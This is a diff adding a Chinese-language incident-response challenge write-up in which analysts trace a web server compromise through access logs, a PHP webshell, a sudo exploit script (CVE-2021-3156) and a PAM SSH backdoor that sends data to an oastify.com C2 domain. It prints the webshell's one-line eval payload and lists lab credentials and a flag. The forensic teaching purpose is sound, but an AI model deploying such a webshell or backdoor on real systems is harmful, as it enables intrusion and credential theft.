@@ -572,3 +572,52 @@ Decryption keys--Edit-- +号 -- wpa-pwd（key type） syc19940222 (key value) ->
 `rzx@1218`
 9. 拿到的机密文件的文件内容
 `flag{ba3d384b-83dc-49df-a964-f68793c3c877}`
+
+### 7.19
+（本题环境为1-9题题干）模拟某公司门户网站系统存在某高危漏洞，黑客组织利用网站系统存在的漏洞，成功获取到网站的管理权限，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。注意：10.100.0.37虚拟机SSH登录密码：root/Abc@12345(50分)
+1. 第一题：黑客使用的SQL注入工具是（小写）
+    ```
+    cd /var/log/httpd
+    cat access_log-20240718 | grep sqlmap
+    ```
+2. 黑客使用的SQL注入工具版本（如1.1.1）
+`cat access_log-20240718 | grep sqlmap`
+`sqlmap/1.5.8`
+3. webshell
+    ```
+    cat access_log-20240718
+    /var/www/html/upload/img/20121208/201212082353104864.php
+    ```
+4. webshell密码
+`cat /var/www/html/upload/img/20121208/201212082353104864.php`
+`<?php @eval($_POST["cmd"]);?>`
+5. 提取工具路径
+`/var/www/html/upload/exploit_defaults_mailer.py`
+6. 黑客修改的网页
+`grep -r github.com *`
+`/var/www/html/template/default/index.html`
+7. CVE
+`cat /var/www/html/upload/exploit_defaults_mailer.py``
+`cve-2021-3156`
+8. ssh后门文件
+`cat /etc/pam.d/sshd`
+`发现so文件pam_login_linux.so`
+9. ssh的C2地址
+* ida分析
+`用ida64打开pam_login_linux.so分析`
+`在send_message()函数中发现向wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com发送报文`
+* 网路流量抓包
+`在服务器上使用 tcpdump -i 网卡名称 监听网卡流量`
+`使用ssh连接服务器触发pam_login_linux.so`
+`下载tcpdump抓到的pcap文件用wireshark分析，筛选dns数据包可以发现域名解析中有wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com`
+* strings
+  `使用strings提取so文件中的关键字符串也能看到一些线索，去掉每行最后的H再做调整`
+    ```
+    https://H
+    wnn0sum8H
+    iig0psw2H
+    8vmlnonqH
+    bhh75w.oH
+    astify.cH
+    @0om
+    ```
